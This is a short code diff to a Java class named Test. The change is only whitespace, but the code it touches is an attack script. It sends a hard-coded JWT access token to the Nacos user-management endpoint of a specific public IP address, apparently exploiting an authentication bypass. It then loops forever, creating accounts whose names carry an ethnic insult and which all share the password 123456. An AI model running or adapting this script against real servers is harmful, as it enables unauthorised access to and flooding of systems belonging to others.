@@ -17,13 +17,12 @@ import java.util.*;
 public class Test {
 
 
-
     public static void main(String[] args) {
         String url = "http://47.104.20.179:8848/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYwODAzMTEzOX0.sxsKv1jU8YhBwoXnau2Q7sYaTXoU3CEerD7EhGPucJg";
 
 
         while (true) {
-            url += "&username="+"魏狗" + get32()+"&password=123456";
+            url += "&username=" + "魏狗" + get32() + "&password=123456";
             String s = HttpUtil.doPost(url);
             System.out.println(s);
         }
